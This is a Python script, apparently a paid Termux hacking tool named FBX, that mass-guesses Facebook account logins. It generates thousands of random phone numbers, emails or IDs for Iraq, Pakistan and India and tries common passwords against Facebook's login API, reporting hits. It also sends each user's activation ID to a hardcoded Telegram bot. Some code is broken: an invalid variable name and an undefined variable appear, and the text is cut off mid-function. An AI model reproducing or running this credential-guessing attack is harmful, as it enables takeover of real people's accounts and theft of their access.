# python3 /sdcard/FBX/fbx.py
#
#
from datetime import datetime
try:
	import requests
	import os
	import sys
	import time
	import random
	import json
	import colorama
	import hashlib
	import string
	from colorama import Fore
except ImportError:
	os.system('pip2 install requests;pip2 install colorama;pkg install random;python3 fbx.py')


os.system('clear')
os.system('rm -rf .save')
os.system('mkdir .save')


user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
instagram_link = 'https://www.instagram.com'
accept = '*/*'
address = '936619743392459'
speek = '?0'
headers={'accept': accept,'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '282','content-type': 'application/x-www-form-urlencoded','cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1','origin': instagram_link,'referer': instagram_link,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"','sec-ch-ua-mobile': speek,'sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent,'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw','x-ig-app-id': address,'x-ig-www-claim': '0','x-instagram-ajax': '05b80a16b1ac','x-requested-with': 'XMLHttpRequest',}
url_insta="https://www.instagram.com/accounts/login/ajax/"
head = {
'user-agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23'
}
token_login = '1897963273:AAEluZGRx4ijDPenCOA5RbsJ2HRvox-H2V8'
id_login = '1150866732'

def lk(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.002)

def lkk(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.003)

logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
logo = '''\033[31m
                             
        █████    ▄▄▄        ▒██   ██▒
      ▓██       ▓█████▄     ▒▒ █ █▒░
      ▒████    ▒██▒ ▄██    ░░  █░
      ░▓█▒      ▒██░█▀       ░ █ █▒ 
     ▒░▒█░     ▒░▓█  ▀█    ▓▒██▒ ▒██▒
     ░ ▒ ░     ░░▒▓███▀   ▒▒▒  ░ ░▓ ░
     ░ ░       ░▒░▒   ░    ░░   ░▒ ░
       ░ ░       ░    ░    ░     ░    
     ░       ░   ░         ░      ░''' 
gt = '''\x1b[1;97m
 Auther: \033[31mdrag0n Coder
 \x1b[1;97mChannal Telegram: \033[31mdrag0n_coder
 \x1b[1;97mNote: \033[32m5$\x1b[1;97m id-active krdn \x1b[1;97m'''

ff = ''' ________________________________
 |                               |
 | [1] Crack faecbook (\033[32mspeed\x1b[1;97m)    |
 | [2] Crack faecbook (\033[93mNo speed\x1b[1;97m) |
 | [3] Crack faecbook (\033[34mfree\x1b[1;97m)     |
 | [4] Crack fb pakistan (\033[32mspeed\x1b[1;97m) |
 | [5] Crack fb india (\033[32mspeed\x1b[1;97m)    |
 | [6] Crack Email  (\033[32mspeed\x1b[1;97m)      |
 | [7] Crack fb-old (\033[32mspeed\x1b[1;97m)      |
 | [8] View TikTok  (\033[32mspeed\x1b[1;97m)      |
 | [9] Crack Cart (\033[32mspeed\x1b[1;97m)        |
 | [10] Crack Pubg  (\033[32mspeed\x1b[1;97m)      |  
 | [11] Crack list-pass (\033[32mspeed\x1b[1;97m)  |
 | [12] Crack fb-id (\033[32mspeed\x1b[1;97m)      |
 | [13] Faecbook-Close (\033[32mspeed\x1b[1;97m)   |
 |_______________________________|
'''
cp = ' \x1b[1;97m[\033[93mCP\x1b[1;97m]'
drag0n-ok = ' \x1b[1;97m[\033[32mOK\x1b[1;97m]'
no = ' \x1b[1;97m[\033[31mNO\x1b[1;97m]'
r1 = '\x1b[1;97m Number: '
r2 = '  Passowrd: '

num = '''\033[32m 770-771-772-773-774
  750-751-752-753-754
   780-781-782-783-784
'''
def pasowrd():
	os.system('clear')
	print(logo)
	print(gt)
	print(logo2)
	username=input(' \x1b[90;1mUsername : ')
	passowrd =input(' \x1b[90;1mPassowrd : ')
	
	
	
	

	if username=='rebin' and passowrd=='fbx':
		ukl = open('.save/active.txt', 'r')
		for kj in ukl:
			spk = kj.split()
			chat_login = '[=] Tool FBX\n[=] iD '+str(spk)+'\n[=] Time '+str(datetime.now())
		ukl.close()
		
		try:
			requests.post('https://api.telegram.org/bot'+token_login+'/sendMessage?chat_id='+id_login+'&text='+chat_login+'\n')
		except:
			print('\033[31m No Login internet contemplation')
		
		uidd = open('.save/active.txt', 'r')
		for j in uidd:
			sp = j.split()
		try:
			manglist = requests.get('https://raw.githubusercontent.com/anonymus100/id-active/main/fbx.txt')
			idd = manglist.text
		except:
			print('\033[31m No Login internet contemplation')
		
		
		for s in idd.split():
			print(s)
			if s == sp[0]:
				lk('\033[32m login FBX and conect tools FBX , get python3')
				time.sleep(0.9)
				os.system('pkg install fbx')
				time.sleep(0.3)
				dast()
			else:
				print(logo2)
				print(' Bo iD active krd msg bnera la telegram > \033[31mK_7K_K')
				print(' Nrxe iD active krdn:\033[32m 5 hazary korek')
				print('\x1b[1;97m       ID To >>\033[32m ' + sp[0])
				print(logo2)
				time.sleep(1.0)
				os.sys.exit()



	else:
		print('\033[31 Halaya')
		a1 = 0
		for dd in range(30):
			print('\033[31mno login FBX')
			time.sleep(0.04)
		pasowrd()





def dast():
	os.system('clear')
	print(logo)
	print('\n'+logo2)
	time.sleep(0.8)
	print(gt)
	lk(ff)
	aco()

def aco():
	kk =input('[+]--> ')
	for xcc in range(4):
		lkk('[*] https://fbx '+kk+'/termux-packages-24:')
		time.sleep(0.1)
	if kk=='1':
		number()
	elif kk=='2':
		number()
	elif kk=='3':
		number()
	elif kk=='4':
		pakistan_un()
	elif kk=='5':
		india_un()
	elif kk=='6':
		email_un()
	elif kk=='7':
		fb_old()
	elif kk=='8':
		os.system('clear')
		view_un()
	elif kk=='9':
		cart()
		print(logo)
	elif kk=='10':
		os.system('clear')
		print(logo)
		print('    ')
		print(logo2)
		FILname()
	elif kk=='11':
		crack_pas()
	elif kk=='12':
		os.system('clear')
		id_clone()
	else:
		sys.exit()
		aco()


def id_clone():
	d = '1000'
	file = open('.save/id_clone.txt','w')
	for line in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x4=random.choice(x)
		x5=random.choice(x)
		x6=random.choice(x)
		x7=random.choice(x)
		x8=random.choice(x)
		x9 =random.choice(x)
		x10 =random.choice(x)
		x11 =random.choice(x)
		x_id =x1+x2+x3+x4+x5+x6+x7+x8+x9+x11
		xkk=d+x_id
		file.write(xkk+"\n")
	file.close()
	crack_id()

def crack_id():
	print(logo)
	print('\n'+logo2)
	name = input('\x1b[1;97m Name: ')
	pa = input(' Passowrd: ')
	r1 = '\x1b[1;97m ID: '
	lk('\x1b[1;97m Crack fb-id...')
	lk('\033[34m line-id : \033[32m2000')
	lk('\033[36m time...')
	lk('\x1b[1;97m by channal > \033[31mdragon_coder ❤')
	print(logo2)
	ph = open(".save/id_clone.txt","r").readlines()
	p1 = 0
	for x in ph:
		p1+=1
		if p1==4:
			print('')
			p1=0
		u = x.strip()
		pas1 ='123456789'
		pas2 ='1234512345'
		pas3='1122334455'
		pas4='1234554321'
		pas5='123454321'
		pas6 ='123456123456'
		pas7 =pa
		pas_list = [pas1,pas2,pas3,pas4,pas5,pas6,pas7]
		pk = random.choice(pas_list)
		user =u
		
		
		
		url1="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url1,headers=head).text
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		elif 'www.facebook.com' in re:
			print(cp+r1+user+r2+pas1)



		else:
			url2="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			re = requests.get(url2,headers=head).text
			if '"secure":true,"httponly":true}]' in re:
				print(ok+r1+user+r2+pas2)
			elif 'www.facebook.com' in re:
				print(cp+r1+user+r2+pas2)



			else:
				url3="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
				re = requests.get(url3,headers=head).text
				if '"secure":true,"httponly":true}]' in re:
					print(ok+r1+user+r2+pas3)
				elif 'www.facebook.com' in re:
					print(cp+r1+user+r2+pas3)



				else:
					url4="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
					re = requests.get(url4,headers=head).text
					if '"secure":true,"httponly":true}]' in re:
						print(ok+r1+user+r2+pas4)
					elif 'www.facebook.com' in re:
						print(cp+r1+user+r2+pas4)



					else:
						url5="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas5  + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
						re = requests.get(url5,headers=head).text
						if '"secure":true,"httponly":true}]' in re:
							print(ok+r1+user+r2+pas5)
						elif 'www.facebook.com' in re:
							print(cp+r1+user+r2+pas5)



						else:
							url6="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas6 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
							re = requests.get(url6,headers=head).text
							if '"secure":true,"httponly":true}]' in re:
								print(ok+r1+user+r2+pas6)
							elif 'www.facebook.com' in re:
								print(cp+r1+user+r2+pas6)



							else:
								url7="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas7 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
								re = requests.get(url7,headers=head).text
								if '"secure":true,"httponly":true}]' in re:
									print(ok+r1+user+r2+pas7)
								elif 'www.facebook.com' in re:
									print(cp+r1+user+r2+pas7)
								
								
								
								else:
									print(no+r1+user+r2+pk)

#####################################################################################################################################################################

def crack_pas():
	os.system('clear')
	print(logo)
	print('\n'+logo2)
	print(' [1] my list-pass \n [2] make list-pass')
	ww = input('------> ')
	if ww=='1':
		os.system('clear')
		print(logo)
		print('\n'+logo2)
		paso = input(' input file: ')
		faka = paso
	elif ww=='2':
		os.system('clear')
		print(logo)
		print('\n'+logo2)
		print(' name and username and identity')
		pas1 = input(' pas1 : ')
		pas2 = input(' pas2 : ')
		fkk = open('.save/work.txt','w')
		for ddw in range(2000):
			fg = '1234567890'
			xe1 = random.choice(fg)
			xe2 = random.choice(fg)
			xe3 = random.choice(fg)
			pak1 = pas1+xe1+xe2+xe3
			pak2 = xe1+xe2+xe3+pas2
			list_pak =[pak1,pak2]
			paso = random.choice(list_pak)
			fkk.write(paso+'\n')
		faka = '.save/work.txt'
		fkk.close()
	arg  = input(' Username fb : ')
	lk('\x1b[1;97m Crack espousal..')
	lk('\033[34m list-pass : \033[32m'+str(len(faka)))
	lk('\033[36m time...')
	lk('\x1b[1;97m by channal > \033[31mdrag0n_coder ❤')
	print(logo2)
	ph = open(faka,"r").readlines()
	for x in ph:
		pas1 = x.strip()
		user = arg
		
		url1="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url1,headers=head).text
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		elif 'www.facebook.com' in re:
			print(cp+r1+user+r2+pas1)



def view_un():
	os.system('clear')
	print(logo)
	print('')
	print(logo2)
	get_id_vedio()
	
def pakistan_un():
	os.system('clear')
	print(logo)
	print(logo2)
	print('\x1b[1;92m  355-334-335\n   336-337-338\n    339-351-352')
	print('\x1b[1;97m')
	pka = input(" Number : ")
	file = open('.save/number.txt','w')
	for line in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x4=random.choice(x)
		x5=random.choice(x)
		x6=random.choice(x)
		x7=random.choice(x)
		x8=x1+x2+x3+x4+x5+x6+x7
		x9='+92'+pka+x8
		file.write(x9+"\n")
	file.close()
	pakistan()


def india_un():
	os.system('clear')
	print(logo)
	print(logo2)
	print("\x1b[1;92m 905-755-995\n 855-935-965-975")
	print('\x1b[1;97m')
	pka = input(" Number : ")
	file = open('.save/number.txt','w')
	for line in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x4=random.choice(x)
		x5=random.choice(x)
		x6=random.choice(x)
		x7=random.choice(x)
		x8=x1+x2+x3+x4+x5+x6+x7
		x9='+91'+pka+x8
		file.write(x9+"\n")
	file.close()
	india()


def email_un():
	os.system('clear')
	print(logo)
	print(logo2)
	print(' Nawek bnosa,, be kamw korte')
	name_email = input(' Name user: ')
	em = open(".save/email.txt","w")
	for gg in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x0=name_email+x1+x2+x3
		em.write(x0+'\n')
	em.close()
	crack_email()


def number():
	os.system("clear")
	print(logo)
	print(logo2)
	print(num)
	print(logo2)
	inn=input(" Number : ")
	filer = open(".save/number.txt","w")
	
	for line in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x4=random.choice(x)
		x5=random.choice(x)
		x6=random.choice(x)
		x7=random.choice(x)
		x8=x1+x2+x3+x4+x5+x6+x7
		x9=inn+x8
		filer.write(x9+"\n")
	acion()

def acion():
	lk('\x1b[1;97m Crack faecbook...')
	lk('\033[34m File line : \033[32m2000')
	lk('\033[36m time...')
	lk('\x1b[1;97m by channal > \033[31mdrag0n_coder ❤')
	print(logo2)
	area = '+964'
	ph = open(".save/number.txt","r").readlines()
	p1 = 0
	for x in ph:
		p1+=1
		if p1==4:
			print('')
			p1=0
		u = x.strip()
		pas1 ='123456789'
		pas2 ='1234512345'
		pas3='1122334455'
		pas4='1234554321'
		pas5='123454321'
		pas6 ='123456123456'
		pas7 =u
		pas_list = [pas1,pas2,pas3,pas4,pas5,pas6,pas7]
		pk = random.choice(pas_list)
		user =area+u
		
		
		
		url1="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url1,headers=head).text
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		elif 'www.facebook.com' in re:
			print(cp+r1+user+r2+pas1)



		else:
			url2="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			re = requests.get(url2,headers=head).text
			if '"secure":true,"httponly":true}]' in re:
				print(ok+r1+user+r2+pas2)
			elif 'www.facebook.com' in re:
				print(cp+r1+user+r2+pas2)



			else:
				url3="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
				re = requests.get(url3,headers=head).text
				if '"secure":true,"httponly":true}]' in re:
					print(ok+r1+user+r2+pas3)
				elif 'www.facebook.com' in re:
					print(cp+r1+user+r2+pas3)



				else:
					url4="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
					re = requests.get(url4,headers=head).text
					if '"secure":true,"httponly":true}]' in re:
						print(ok+r1+user+r2+pas4)
					elif 'www.facebook.com' in re:
						print(cp+r1+user+r2+pas4)



					else:
						url5="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas5  + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
						re = requests.get(url5,headers=head).text
						if '"secure":true,"httponly":true}]' in re:
							print(ok+r1+user+r2+pas5)
						elif 'www.facebook.com' in re:
							print(cp+r1+user+r2+pas5)



						else:
							url6="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas6 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
							re = requests.get(url6,headers=head).text
							if '"secure":true,"httponly":true}]' in re:
								print(ok+r1+user+r2+pas6)
							elif 'www.facebook.com' in re:
								print(cp+r1+user+r2+pas6)



							else:
								url7="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas7 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
								re = requests.get(url7,headers=head).text
								if '"secure":true,"httponly":true}]' in re:
									print(ok+r1+user+r2+pas7)
								elif 'www.facebook.com' in re:
									print(cp+r1+user+r2+pas7)
								
								
								
								else:
									print(no+r1+user+r2+pk)
###################################################################################################################################################


def crack_email():
	r1 = '\x1b[1;97m Email: '
	lk('\x1b[1;97m Crack Email,fb...')
	lk('\033[34m File line : \033[32m2000')
	lk('\033[36m time...')
	lk('\x1b[1;97m by channal > \033[31mdrag0n_coder ❤')
	print(logo2)
	ph = open(".save/email.txt","r").readlines()
	p1 = 0
	for x in ph:
		p1+=1
		if p1==4:
			print('')
			p1=0
		u = x.strip()
		pas1 ='123456789'
		pas2 ='1234512345'
		pas3='1122334455'
		pas4='1234554321'
		pas5='123454321'
		pas6 ='123456123456'
		pas7 =u
		pas_list = [pas1,pas2,pas3,pas4,pas5,pas6,pas7]
		pk = random.choice(pas_list)
		user =u+'@gmail.com'
		
		
		
		url1="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url1,headers=head).text
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		elif 'www.facebook.com' in re:
			print(cp+r1+user+r2+pas1)



		else:
			url2="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			re = requests.get(url2,headers=head).text
			if '"secure":true,"httponly":true}]' in re:
				print(ok+r1+user+r2+pas2)
			elif 'www.facebook.com' in re:
				print(cp+r1+user+r2+pas2)



			else:
				url3="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
				re = requests.get(url3,headers=head).text
				if '"secure":true,"httponly":true}]' in re:
					print(ok+r1+user+r2+pas3)
				elif 'www.facebook.com' in re:
					print(cp+r1+user+r2+pas3)



				else:
					url4="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
					re = requests.get(url4,headers=head).text
					if '"secure":true,"httponly":true}]' in re:
						print(ok+r1+user+r2+pas4)
					elif 'www.facebook.com' in re:
						print(cp+r1+user+r2+pas4)



					else:
						url5="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas5  + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
						re = requests.get(url5,headers=head).text
						if '"secure":true,"httponly":true}]' in re:
							print(ok+r1+user+r2+pas5)
						elif 'www.facebook.com' in re:
							print(cp+r1+user+r2+pas5)



						else:
							url6="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas6 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
							re = requests.get(url6,headers=head).text
							if '"secure":true,"httponly":true}]' in re:
								print(ok+r1+user+r2+pas6)
							elif 'www.facebook.com' in re:
								print(cp+r1+user+r2+pas6)



							else:
								url7="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas7 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
								re = requests.get(url7,headers=head).text
								if '"secure":true,"httponly":true}]' in re:
									print(ok+r1+user+r2+pas7)
								elif 'www.facebook.com' in re:
									print(cp+r1+user+r2+pas7)
								
								
								
								else:
									print(no+r1+user+r2+pk)
###################################################################################################################################################
def pakistan():
	lk('\x1b[1;97m Crack fb pakistan...')
	lk('\033[34m File line : \033[32m2000')
	lk('\033[36m time...')
	lk('\x1b[1;97m by channal > \033[31mdrag0n_coder ❤')
	print(logo2)
	ph = open(".save/number.txt","r").readlines()
	p1 = 0
	for x in ph:
		p1+=1
		if p1==4:
			print('')
			p1=0
		u = x.strip()
		pas1 ='123456789'
		pas2 ='1234512345'
		pas3='1122334455'
		pas4='1234554321'
		pas5='123454321'
		pas6 ='123456123456'
		pas7 ='pakistan'
		pas_list = [pas1,pas2,pas3,pas4,pas5,pas6,pas7]
		pk = random.choice(pas_list)
		user =u
		
		
		
		url1="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url1,headers=head).text
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		elif 'www.facebook.com' in re:
			print(cp+r1+user+r2+pas1)



		else:
			url2="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			re = requests.get(url2,headers=head).text
			if '"secure":true,"httponly":true}]' in re:
				print(ok+r1+user+r2+pas2)
			elif 'www.facebook.com' in re:
				print(cp+r1+user+r2+pas2)



			else:
				url3="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
				re = requests.get(url3,headers=head).text
				if '"secure":true,"httponly":true}]' in re:
					print(ok+r1+user+r2+pas3)
				elif 'www.facebook.com' in re:
					print(cp+r1+user+r2+pas3)



				else:
					url4="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
					re = requests.get(url4,headers=head).text
					if '"secure":true,"httponly":true}]' in re:
						print(ok+r1+user+r2+pas4)
					elif 'www.facebook.com' in re:
						print(cp+r1+user+r2+pas4)



					else:
						url5="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas5  + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
						re = requests.get(url5,headers=head).text
						if '"secure":true,"httponly":true}]' in re:
							print(ok+r1+user+r2+pas5)
						elif 'www.facebook.com' in re:
							print(cp+r1+user+r2+pas5)



						else:
							url6="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas6 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
							re = requests.get(url6,headers=head).text
							if '"secure":true,"httponly":true}]' in re:
								print(ok+r1+user+r2+pas6)
							elif 'www.facebook.com' in re:
								print(cp+r1+user+r2+pas6)



							else:
								url7="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas7 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
								re = requests.get(url7,headers=head).text
								if '"secure":true,"httponly":true}]' in re:
									print(ok+r1+user+r2+pas7)
								elif 'www.facebook.com' in re:
									print(cp+r1+user+r2+pas7)
								
								
								
								else:
									print(no+r1+user+r2+pk)


###################################################################################################################################################


def india():
	lk('\x1b[1;97m Crack fb india...')
	lk('\033[34m File line : \033[32m2000')
	lk('\033[36m time...')
	lk('\x1b[1;97m by channal > \033[31mdrag0n_coder ❤')
	print(logo2)
	ph = open(".save/number.txt","r").readlines()
	p1 = 0
	for x in ph:
		p1+=1
		if p1==4:
			print('')
			p1=0
		u = x.strip()
		pas1 ='123456789'
		pas2 ='1234512345'
		pas3='1122334455'
		pas4='1234554321'
		pas5='123454321'
		pas6 ='123456123456'
		pas7 ='pakistan'
		pas_list = [pas1,pas2,pas3,pas4,pas5,pas6,pas7]
		pk = random.choice(pas_list)
		user =u
		
		
		
		url1="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url1,headers=head).text
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		elif 'www.facebook.com' in re:
			print(cp+r1+user+r2+pas1)



		else:
			url2="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			re = requests.get(url2,headers=head).text
			if '"secure":true,"httponly":true}]' in re:
				print(ok+r1+user+r2+pas2)
			elif 'www.facebook.com' in re:
				print(cp+r1+user+r2+pas2)



			else:
				url3="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
				re = requests.get(url3,headers=head).text
				if '"secure":true,"httponly":true}]' in re:
					print(ok+r1+user+r2+pas3)
				elif 'www.facebook.com' in re:
					print(cp+r1+user+r2+pas3)



				else:
					url4="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
					re = requests.get(url4,headers=head).text
					if '"secure":true,"httponly":true}]' in re:
						print(ok+r1+user+r2+pas4)
					elif 'www.facebook.com' in re:
						print(cp+r1+user+r2+pas4)



					else:
						url5="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas5  + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
						re = requests.get(url5,headers=head).text
						if '"secure":true,"httponly":true}]' in re:
							print(ok+r1+user+r2+pas5)
						elif 'www.facebook.com' in re:
							print(cp+r1+user+r2+pas5)



						else:
